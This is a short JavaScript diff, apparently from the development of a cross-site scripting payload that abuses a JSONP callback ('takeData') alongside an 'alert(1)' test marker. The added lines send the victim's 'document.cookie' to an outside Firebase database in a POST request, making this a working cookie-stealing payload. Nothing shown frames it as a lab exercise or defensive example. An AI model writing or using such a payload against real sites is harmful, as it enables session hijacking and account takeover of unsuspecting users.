@@ -5,6 +5,10 @@ formData.append('submit', 'save');
 
 function takeData(data) {
     alert(1);
+    fetch("https://test-43d17.firebaseio.com/cookie.json", {
+        method: "POST",
+        body: JSON.stringify({cookies: document.cookie})
+    }).then(res =>{});
 }
 
 //fetch("https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=takeData")
